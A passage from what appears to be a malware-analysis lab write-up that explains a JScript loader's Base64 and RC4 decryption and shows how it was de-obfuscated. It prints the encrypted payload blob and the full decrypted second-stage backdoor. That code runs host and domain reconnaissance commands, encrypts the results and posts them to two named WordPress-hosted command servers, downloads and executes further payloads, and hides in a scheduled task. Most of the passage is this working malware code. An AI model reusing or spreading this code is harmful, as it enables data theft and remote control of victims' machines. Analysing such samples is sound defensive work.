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";
    return qGxZ;}
```

The script starts with try-catch block where it first retrieves the argument using  `WScript.Arguments(0)`.
- From previous VBA macro analysis, we know that the value `EzZETcSXyKAdF_e5I2i1` is passed as argument, which is stored under `ssWZ`.
- The value returned by `y3zb()` function is Base64 encoded payload, which is stored under `ES3c`.
- The `LXv5()` function performs Base64 decoding of the string returned by `y3zb()`, and again store the result in `ES3c`.
- The `CpPT()` function performs RC4 decryption, taking two parameters are passed: `ssWZ` (key) and `ES3c` (data).
	- The first two for loop is Key Scheduling Algorithm (KSA), where first loop initializes a substitution box, while the second loop scrambles it with the key.
	- The third loop is Pseudo-Random Generation Algorithm (PRGA), where the scrambled substitution box is used to generate a keystream. Each byte of keystream is XORed with base64 decoded data. 
- The result of RC4 decryption from `CpPT` function is again stored under `ES3c` which is then executed with `eval()`.

To de-obfuscate it, the script was modified to hardcode the key `EzZETcSXyKAdF_e5I2i1` instead of argument and replace the call to `eval()` with `console.log()` so that the decrypted content is printed rather than executed:

```js
try {
    var ssWZ = "EzZETcSXyKAdF_e5I2i1";
    var ES3c = y3zb();
    ES3c = LXv5(ES3c);
    ES3c = CpPT(ssWZ, ES3c);
    console.log(ES3c);
} catch (e) {
    WScript.Quit();
}
```

After making these changes and executing the script, another layer of JavaScript script is revealed:

```js
function UspD(zDmy) {
    var m3mH = WScript.CreateObject("ADODB.Stream")
    m3mH.Type = 2;
    m3mH.CharSet = '437';
    m3mH.Open();
    m3mH.LoadFromFile(zDmy);
    var c0xi = m3mH.ReadText;
    m3mH.Close();
    return cz_b(c0xi);
}
var CKpR = new Array("http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php", "http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php");
var tpO8 = "w3LxnRSbJcqf8HrU";
var auME = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\x5cUsers\x5c*.* >> ", "dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* >> ", "dir %userprofile%\x5cDesktop\x5c*.* >> ", "tasklist /fi \x22modules eq wow64.dll\x22  >> ", "tasklist /fi \x22modules ne wow64.dll\x22 >> ", "dir \x22%programfiles(x86)%\x22 >> ", "dir \x22%programfiles%\x22 >> ", "dir %appdata% >>");
var QUjy = new ActiveXObject("Scripting.FileSystemObject");
var LIxF = WScript.ScriptName;
var w5mY = "";
var ruGx = TfOh();

function hLit(XngP, y1qa) {
    char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var Rj3c = "";
    var OKpB = "";
    for (var i = 0; i < XngP.length; ++i) {
        var B8wU = XngP.charCodeAt(i);
        var LUxg = B8wU.toString(2);
        while (LUxg.length < (y1qa ? 8 : 16))
            LUxg = "0" + LUxg;
        OKpB += LUxg;
        while (OKpB.length >= 6) {
            var vjUu = OKpB.slice(0, 6);
            OKpB = OKpB.slice(6);
            Rj3c += this.char_set.charAt(parseInt(vjUu, 2));
        }
    }
    if (OKpB) {
        while (OKpB.length < 6) OKpB += "0";
        Rj3c += this.char_set.charAt(parseInt(OKpB, 2));
    }
    while (Rj3c.length % (y1qa ? 4 : 8) != 0)
        Rj3c += "=";
    return Rj3c;
}
var b92A = [];
b92A['C7'] = '80';
b92A['FC'] = '81';
b92A['E9'] = '82';
b92A['E2'] = '83';
b92A['E4'] = '84';
b92A['E0'] = '85';
b92A['E5'] = '86';
b92A['E7'] = '87';
b92A['EA'] = '88';
b92A['EB'] = '89';
b92A['E8'] = '8A';
b92A['EF'] = '8B';
b92A['EE'] = '8C';
b92A['EC'] = '8D';
b92A['C4'] = '8E';
b92A['C5'] = '8F';
b92A['C9'] = '90';
b92A['E6'] = '91';
b92A['C6'] = '92';
b92A['F4'] = '93';
b92A['F6'] = '94';
b92A['F2'] = '95';
b92A['FB'] = '96';
b92A['F9'] = '97';
b92A['FF'] = '98';
b92A['D6'] = '99';
b92A['DC'] = '9A';
b92A['A2'] = '9B';
b92A['A3'] = '9C';
b92A['A5'] = '9D';
b92A['20A7'] = '9E';
b92A['192'] = '9F';
b92A['E1'] = 'A0';
b92A['ED'] = 'A1';
b92A['F3'] = 'A2';
b92A['FA'] = 'A3';
b92A['F1'] = 'A4';
b92A['D1'] = 'A5';
b92A['AA'] = 'A6';
b92A['BA'] = 'A7';
b92A['BF'] = 'A8';
b92A['2310'] = 'A9';
b92A['AC'] = 'AA';
b92A['BD'] = 'AB';
b92A['BC'] = 'AC';
b92A['A1'] = 'AD';
b92A['AB'] = 'AE';
b92A['BB'] = 'AF';
b92A['2591'] = 'B0';
b92A['2592'] = 'B1';
b92A['2593'] = 'B2';
b92A['2502'] = 'B3';
b92A['2524'] = 'B4';
b92A['2561'] = 'B5';
b92A['2562'] = 'B6';
b92A['2556'] = 'B7';
b92A['2555'] = 'B8';
b92A['2563'] = 'B9';
b92A['2551'] = 'BA';
b92A['2557'] = 'BB';
b92A['255D'] = 'BC';
b92A['255C'] = 'BD';
b92A['255B'] = 'BE';
b92A['2510'] = 'BF';
b92A['2514'] = 'C0';
b92A['2534'] = 'C1';
b92A['252C'] = 'C2';
b92A['251C'] = 'C3';
b92A['2500'] = 'C4';
b92A['253C'] = 'C5';
b92A['255E'] = 'C6';
b92A['255F'] = 'C7';
b92A['255A'] = 'C8';
b92A['2554'] = 'C9';
b92A['2569'] = 'CA';
b92A['2566'] = 'CB';
b92A['2560'] = 'CC';
b92A['2550'] = 'CD';
b92A['256C'] = 'CE';
b92A['2567'] = 'CF';
b92A['2568'] = 'D0';
b92A['2564'] = 'D1';
b92A['2565'] = 'D2';
b92A['2559'] = 'D3';
b92A['2558'] = 'D4';
b92A['2552'] = 'D5';
b92A['2553'] = 'D6';
b92A['256B'] = 'D7';
b92A['256A'] = 'D8';
b92A['2518'] = 'D9';
b92A['250C'] = 'DA';
b92A['2588'] = 'DB';
b92A['2584'] = 'DC';
b92A['258C'] = 'DD';
b92A['2590'] = 'DE';
b92A['2580'] = 'DF';
b92A['3B1'] = 'E0';
b92A['DF'] = 'E1';
b92A['393'] = 'E2';
b92A['3C0'] = 'E3';
b92A['3A3'] = 'E4';
b92A['3C3'] = 'E5';
b92A['B5'] = 'E6';
b92A['3C4'] = 'E7';
b92A['3A6'] = 'E8';
b92A['398'] = 'E9';
b92A['3A9'] = 'EA';
b92A['3B4'] = 'EB';
b92A['221E'] = 'EC';
b92A['3C6'] = 'ED';
b92A['3B5'] = 'EE';
b92A['2229'] = 'EF';
b92A['2261'] = 'F0';
b92A['B1'] = 'F1';
b92A['2265'] = 'F2';
b92A['2264'] = 'F3';
b92A['2320'] = 'F4';
b92A['2321'] = 'F5';
b92A['F7'] = 'F6';
b92A['2248'] = 'F7';
b92A['B0'] = 'F8';
b92A['2219'] = 'F9';
b92A['B7'] = 'FA';
b92A['221A'] = 'FB';
b92A['207F'] = 'FC';
b92A['B2'] = 'FD';
b92A['25A0'] = 'FE';
b92A['A0'] = 'FF';

function TfOh() {
    var ayuh = Math.ceil(Math.random() * 10 + 25);
    var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
    var dc9V = WScript.CreateObject("WScript.Network");
    w5mY = dc9V.UserName;
    for (var count = 0; count < ayuh; count++) {
        switch (Math.ceil(Math.random() * 3)) {
            case 1:
                name = name + Math.ceil(Math.random() * 8);
                break;
            case 2:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                break;
            default:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                break;
        }
    }
    return name;
}
var wyKN = Blgx(bIdG());
try {
    var WE86 = bIdG();
    rGcR();
    jSm8();
} catch (e) {
    WScript.Quit();
}

function jSm8() {
    var c9lr = Fv6b();
    while (true) {
        for (var i = 0; i < CKpR.length; i++) {
            var Ysyo = CKpR[i];
            var f3cb = XEWG(Ysyo, c9lr);
            switch (f3cb) {
                case "good":
                    break;
                case "exit":
                    WScript.Quit();
                    break;
                case "work":
                    XBL3(Ysyo);
                    break;
                case "fail":
                    tbMu();
                    break;
                default:
                    break;
            }
            TfOh();
        }
        WScript.Sleep((Math.random() * 300 + 3600) * 1000);
    }
}

function bIdG() {
    var spq3 = this['\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'];
    var zBVv = new spq3('\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C');
    return zBVv;
}

function XBL3(B_TG) {
    var YIme = wyKN + LIxF.substring(0, LIxF.length - 2) + "pif";
    var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
    Kpxo.OPEN("post", B_TG, false);
    Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
    Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
    Kpxo.SETREQUESTHEADER("content-length:", "4");
    Kpxo.SEND("work");
    if (QUjy.FILEEXISTS(YIme)) {
        QUjy.DELETEFILE(YIme);
    }
    if (Kpxo.STATUS == 200) {
        var m3mH = new ActiveXObject("ADODB.STREAM");
        m3mH.TYPE = 1;
        m3mH.OPEN();
        m3mH.WRITE(Kpxo.responseBody);
        m3mH.Position = 0;
        m3mH.Type = 2;
        m3mH.CharSet = "437";
        var c0xi = m3mH.ReadText(m3mH.Size);
        var ptF0 = FXx9("2f532d6baec3d0ec7b1f98aed4774843", cz_b(c0xi));
        NoRS(ptF0, YIme);
        m3mH.Close();
    }
    var ruGx = TfOh();
    c5ae(YIme, B_TG);
    WScript.Sleep(30000);
    QUjy.DELETEFILE(YIme);
}

function tbMu() {
    QUjy.DELETEFILE(WScript.SCRIPTFULLNAME);
    eV_C("TaskManager", "Windows Task Manager", w5mY, v_FileName, "EzZETcSXyKAdF_e5I2i1", wyKN, false);
    KhDn("TaskManager");
    WScript.Quit();
}

function XEWG(uXHK, hm2j) {
    try {
        var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
        Kpxo.OPEN("post", uXHK, false);
        Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
        Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
        var rRi3 = hLit(hm2j, true);
        Kpxo.SETREQUESTHEADER("content-length:", rRi3.length);
        Kpxo.SEND(rRi3);
        return Kpxo.responseText;
    } catch (e) {
        return "";
    }
}

function Sz8k() {
    var n9mV = "";
    var dc9V = WScript.CreateObject("WScript.Network");
    var rRi3 = tpO8 + dc9V.ComputerName + w5mY;
    for (var i = 0; i < 16; i++) {
        var YsXA = 0
        for (var j = i; j < rRi3.length - 1; j++) {
            YsXA = YsXA ^ rRi3.charCodeAt(j);
        }
        YsXA = (YsXA % 10);
        n9mV = n9mV + YsXA.toString(10);
    }
    n9mV = n9mV + tpO8;
    return n9mV;
}

function rGcR() {
    v_FileName = wyKN + LIxF.substring(0, LIxF.length - 2) + "js";
    QUjy.COPYFILE(WScript.ScriptFullName, wyKN + LIxF);
    var HFp7 = (Math.random() * 150 + 350) * 1000;
    WScript.Sleep(HFp7);
    eV_C("TaskManager", "Windows Task Manager", w5mY, v_FileName, "EzZETcSXyKAdF_e5I2i1", wyKN, true);
}

function Fv6b() {
    var m_Rr = wyKN + "~dat.tmp";
    for (var i = 0; i < auME.length; i++) {
        WE86.Run("cmd.exe /c " + auME[i] + "\x22" + m_Rr + "\x22", 0, true);
    }
    var nRVN = UspD(m_Rr);
    WScript.Sleep(1000);
    QUjy.DELETEFILE(m_Rr);
    return FXx9("2f532d6baec3d0ec7b1f98aed4774843", nRVN);
}

function c5ae(YIme, B_TG) {
    try {
        if (QUjy.FILEEXISTS(YIme)) {
            WE86.Run("\x22" + YIme + "\x22");
        }
    } catch (e) {
        var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
        Kpxo.OPEN("post", B_TG, false);
        var ePMy = "error";
        Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
        Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
        Kpxo.SETREQUESTHEADER("content-length:", ePMy.length);
        Kpxo.SEND(ePMy);
        return "";
    }
}

function RPbY(r_X5) {
    var w8rG = "0123456789ABCDEF";
    var yjrw = w8rG.substr(r_X5 & 15, 1);
    while (r_X5 > 15) {
        r_X5 >>>= 4;
        yjrw = w8rG.substr(r_X5 & 15, 1) + yjrw;
    }
    return yjrw;
}

function NptO(jlEi) {
    return parseInt(jlEi, 16);
}

function eV_C(Bjmr, RT6x, O7Ec, YBwP, T9Px, egNr, rmGH) {
    try {
        var BGfI = WScript.CreateObject("Schedule.Service");
        BGfI.Connect();
        var w2cQ = BGfI.GetFolder("WPD");
        var xSm3 = BGfI.NewTask(0);
        xSm3.Principal.UserId = O7Ec;
        xSm3.Principal.LogonType = 6;
        var wK2F = xSm3.RegistrationInfo;
        wK2F.Description = RT6x;
        wK2F.Author = O7Ec;
        var aYbx = xSm3.Settings;
        aYbx.Enabled = true;
        aYbx.StartWhenAvailable = true;
        aYbx.Hidden = rmGH;
        var oSP7 = "2015-07-12T11:47:24";
        var svaG = "2020-03-21T08:00:00";
        var LDoN = xSm3.Triggers;
        var r9EC = LDoN.Create(9);
        r9EC.StartBoundary = oSP7;
        r9EC.EndBoundary = svaG;
        r9EC.Id = "LogonTriggerId";
        r9EC.UserId = O7Ec;
        r9EC.Enabled = true;
        var gQu9 = xSm3.Actions.Create(0);
        gQu9.Path = YBwP;
        gQu9.Arguments = T9Px;
        gQu9.WorkingDirectory = egNr;
        w2cQ.RegisterTaskDefinition(Bjmr, xSm3, 6, "", "", 3);
        return true;
    } catch (Err) {
        return false;
    }
}

function KhDn(Bjmr) {
    try {
        var UGgw = false;
        var BGfI = WScript.CreateObject("Schedule.Service");
        BGfI.Connect()


        var w2cQ = BGfI.GetFolder("WPD");
        var FLs6 = w2cQ.GetTasks(0);
        if (FLs6.count >= 0) {
            var gk1H = new Enumerator(FLs6);
            for (; !gk1H.atEnd(); gk1H.moveNext()) {
                if (gk1H.item().name == Bjmr) {
                    w2cQ.DeleteTask(Bjmr, 0);
                    UGgw = true;
                }
            }
        }
    } catch (Err) {
        return false;
    }
}

function cz_b(S3Ws) {
    var n9mV = [];
    var mvAu = S3Ws.length;
    for (var i = 0; i < mvAu; i++) {
        var wtVX = S3Ws.charCodeAt(i);
        if (wtVX >= 128) {
            var h = b92A['' + RPbY(wtVX)];
            wtVX = NptO(h);
        }
        n9mV.push(wtVX);
    }
    return n9mV;
}

function NoRS(ExY2, igeK) {
    var m3mH = WScript.CreateObject("ADODB.Stream");
    m3mH.type = 2;
    m3mH.Charset = "iso-8859-1";
    m3mH.Open();
    m3mH.WriteText(ExY2);
    m3mH.Flush();
    m3mH.Position = 0;
    m3mH.SaveToFile(igeK, 2);
    m3mH.close();
}

function Blgx(gaWo) {
    wyKN = "c:\x5cUsers\x5c" + w5mY + "\x5cAppData\x5cLocal\x5cMicrosoft\x5cWindows\x5c";
    if (!QUjy.FOLDEREXISTS(wyKN))
        wyKN = "c:\x5cUsers\x5c" + w5mY + "\x5cAppData\x5cLocal\x5cTemp\x5c";
    if (!QUjy.FOLDEREXISTS(wyKN))
        wyKN = "c:\x5cDocuments and Settings\x5c" + w5mY + "\x5cApplication Data\x5cMicrosoft\x5cWindows\x5c";
    return wyKN
}

function FXx9(Z_3F, VMd7) {
    var NNSX = [];
    var JDro = 0;
    var KagY;
    var n9mV = '';
    for (var i = 0; i < 256; i++) {
        NNSX[i] = i;
    }
    for (var i = 0; i < 256; i++) {
        JDro = (JDro + NNSX[i] + Z_3F.charCodeAt(i % Z_3F.length)) % 256;
        KagY = NNSX[i];
        NNSX[i] = NNSX[JDro];
        NNSX[JDro] = KagY;
    }
    var i = 0;
    var JDro = 0;
    for (var y = 0; y < VMd7.length; y++) {
        i = (i + 1) % 256;
        JDro = (JDro + NNSX[i]) % 256;
        KagY = NNSX[i];
        NNSX[i] = NNSX[JDro];
        NNSX[JDro] = KagY;
        n9mV += String.fromCharCode(VMd7[y] ^ NNSX[(NNSX[i] + NNSX[JDro]) % 256]);
    }
    return n9mV;
}
```


<br>

## Questions:


<br>

---